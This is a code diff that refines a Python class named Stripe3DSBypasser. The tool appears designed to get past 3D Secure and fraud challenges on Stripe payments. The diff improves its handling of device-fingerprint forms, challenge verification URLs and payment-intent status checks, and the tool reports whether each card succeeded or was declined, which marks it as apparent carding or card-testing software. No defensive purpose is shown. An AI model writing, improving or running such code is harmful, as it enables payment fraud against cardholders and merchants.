@@ -297,13 +297,15 @@ class Stripe3DSBypasser:
         if m:
             device_fp_url = m.group(1)
         elif "safekey" in html_text.lower() or "deviceidentification" in html_text.lower():
-            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html_text, re.I)
+            m_action = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html_text, re.I)
             if m_action:
-                device_fp_url = urljoin(current_method_url, html.unescape(m_action.group(1)))
+                raw_act = html.unescape(m_action.group(1)).strip()
+                device_fp_url = current_method_url if ((not raw_act) or raw_act == "#") else urljoin(current_method_url, raw_act)
         if not device_fp_url:
-            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html_text, re.I)
+            m_action = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html_text, re.I)
             if m_action and "fingerprint" in m_action.group(1).lower():
-                device_fp_url = urljoin(current_method_url, html.unescape(m_action.group(1)))
+                raw_act = html.unescape(m_action.group(1)).strip()
+                device_fp_url = current_method_url if ((not raw_act) or raw_act == "#") else urljoin(current_method_url, raw_act)
 
         if device_fp_url:
             raw_seed = (profile or {}).get("fp_seed")
@@ -407,7 +409,7 @@ class Stripe3DSBypasser:
         rqdata = stripe_js.get("rqdata")
         pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else (sdk_data.get("id") or "")
         raw_vurl = stripe_js.get("verification_url") or f"/v1/payment_intents/{pi_id}/verify_challenge"
-        v_url = f"https://api.stripe.com{raw_vurl}" if raw_vurl.startswith("/") else raw_vurl
+        v_url = f"https://api.stripe.com{raw_vurl}" if str(raw_vurl or "").startswith("/") else str(raw_vurl or "")
 
         if not captcha_solver.has_any_solver_key():
             return {"success": False, "status": "intent_confirmation_challenge", "radar_challenge": True}
@@ -597,26 +599,33 @@ class Stripe3DSBypasser:
                     async with session.get(pi_url, headers=pi_hdr, timeout=10) as pi_r:
                         pi_fresh = await _json(pi_r)
                     if isinstance(pi_fresh, dict):
-                        pi_obj = pi_fresh.get("payment_intent") or pi_fresh.get("setup_intent") or pi_fresh
+                        pi_obj = _as_dict(
+                            pi_fresh.get("payment_intent")
+                            or pi_fresh.get("setup_intent")
+                            or pi_fresh
+                        )
                         stat = pi_obj.get("status")
                         if stat in ("succeeded", "complete", "requires_capture"):
                             return {"success": True, "status": stat, "raw_response": pi_fresh}
                         if stat == "requires_payment_method":
-                            err = pi_obj.get("last_payment_error") or pi_obj.get("last_setup_error") or pi_fresh.get("error") or {}
+                            err_raw = (
+                                pi_obj.get("last_payment_error")
+                                or pi_obj.get("last_setup_error")
+                                or pi_fresh.get("error")
+                            )
+                            err = _as_dict(err_raw)
                             return {
                                 "success": False,
                                 "status": "declined",
                                 "decline_code": err.get("decline_code") or err.get("code") or "card_declined",
-                                "error": err.get("message") or "Card declined",
+                                "error": err.get("message") or (str(err_raw) if err_raw else "Card declined"),
                                 "raw_response": pi_fresh,
                             }
-                        fresh_na = pi_obj.get("next_action") or {}
+                        fresh_na = _as_dict(pi_obj.get("next_action"))
                         fresh_sdk = cls._merge_sdk(fresh_na)
                         if fresh_sdk:
                             sdk_data = {**sdk_data, **fresh_sdk}
-                            # also update acs/creq from refreshed shape
-                            _ch2 = sdk_data.get("three_ds_2_challenge")
-                            _ch2_dict = _ch2 if isinstance(_ch2, dict) else {}
+                            _ch2_dict = _as_dict(sdk_data.get("three_ds_2_challenge"))
                             acs_url = sdk_data.get("acs_url") or _ch2_dict.get("acs_url") or acs_url
                             creq = sdk_data.get("creq") or _ch2_dict.get("creq") or creq
                             session_data = (
